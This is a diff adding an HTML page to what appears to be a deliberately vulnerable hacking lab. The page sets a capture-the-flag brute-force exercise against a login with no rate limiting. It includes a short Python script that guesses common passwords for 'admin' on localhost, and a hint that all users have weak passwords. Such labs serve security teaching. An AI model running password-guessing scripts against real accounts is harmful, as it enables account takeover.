@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Brute Force - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/auth"><i class="fas fa-flask"></i> Auth Labs</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header"><h1>🔐 Brute Force Attack</h1><div class="lab-info"><span class="lab-tag difficulty-easy">Easy</span><span class="lab-tag points"><i class="fas fa-star"></i> 10 pts</span></div></div>
+    <div class="lab-section">
+      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
+      <p>There is NO rate limiting on this login endpoint. Brute force the password for user "admin". Try common passwords.</p>
+    </div>
+    <div class="lab-section">
+      <h2><i class="fas fa-terminal"></i> Login (No Rate Limit)</h2>
+      <div class="vulnerable-form">
+        <label>Username:</label><input type="text" id="bfUser" value="admin" autocomplete="off">
+        <label>Password:</label><input type="text" id="bfPass" placeholder="Try common passwords..." autocomplete="off">
+        <button onclick="bruteLogin()" class="btn">Login</button>
+      </div>
+      <div id="bfResult" class="result-box" style="margin-top:1rem;"></div>
+      <div class="code-block"># Python brute force script:
+import requests
+passwords = ['password', 'admin', 'admin123', '123456', 'qwerty', 'letmein']
+for p in passwords:
+    r = requests.post('http://localhost:3000/labs/auth/brute-force/login',
+        json={'username':'admin','password':p})
+    if r.json()['success']:
+        print(f'Found: {p}')
+        break</div>
+      <div class="hint-box"><i class="fas fa-lightbulb"></i> Usernames in DB: admin, john, alice, bob. They all use common passwords.</div>
+    </div>
+    <div class="flag-submit">
+      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('brute-force','flagInput_bf','flagResult_bf'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_bf" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
+      <div id="flagResult_bf" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+  <script>
+    async function bruteLogin() {
+      const res = await fetch('/labs/auth/brute-force/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:document.getElementById('bfUser').value, password:document.getElementById('bfPass').value}) });
+      const data = await res.json();
+      document.getElementById('bfResult').innerHTML = '<pre>'+JSON.stringify(data,null,2)+'</pre>';
+      document.getElementById('bfResult').className = data.success ? 'success-box' : 'result-box';
+    }
+  </script>
+</body>
+</html>
